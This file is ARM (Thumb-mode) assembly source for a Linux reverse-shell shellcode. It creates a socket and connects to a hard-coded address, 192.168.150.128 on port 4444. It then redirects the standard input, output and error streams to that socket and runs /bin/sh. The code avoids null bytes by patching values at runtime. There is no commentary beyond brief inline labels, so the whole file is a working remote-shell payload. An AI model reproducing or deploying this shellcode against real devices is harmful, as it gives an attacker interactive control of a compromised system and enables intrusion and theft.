.section .text
.global _start

_start:
	adr		r1, THUMB+1
	bx		r1
	
THUMB:
.code 16
	/* socket(2,1,0) - syscall 281 */
	mov		r1, #1
	add		r0, r1, #1
	eor		r2, r2, r2
	mov		r7, #255
	add		r7, #26
	svc		#1

	/* save the sockfd in r11 */
	mov		r11, r0

	/* connect(sockfd, &addr, 16) - syscall 283 */
	adr		r1, ADDR
	strb	r2, [r1, #1]	/* write null byte */
	mov		r2, #16
	mov		r7, #255
	add 	r7, #28
	svc		#1

	/* dup2 - syscall 63 */
	mov		r0, r11
	eor 	r1, r1, r1
	mov		r7, #49
	add		r7, #14
	svc		#1

	mov		r0, r11
	mov		r1, #1
	svc		#1

	mov		r0, r11
	mov		r1, #2
	svc		#1

	/* execve */
	adr		r0, BINSH
	eor		r2, r2, r2
	strb	r2, [r0, #7]	/* Write NULL-terminator for string */
	push	{r0, r2}
	mov		r1, sp
	mov		r7, #11
	svc		#1	

.balign	4

ADDR:
.byte		0x02,0xff		/* AF_INET */
.byte		0x11,0x5c		/* Port 4444*/
.byte		192,168,150,128	/* IP Address */

BINSH:
.ascii		"/bin/shX"
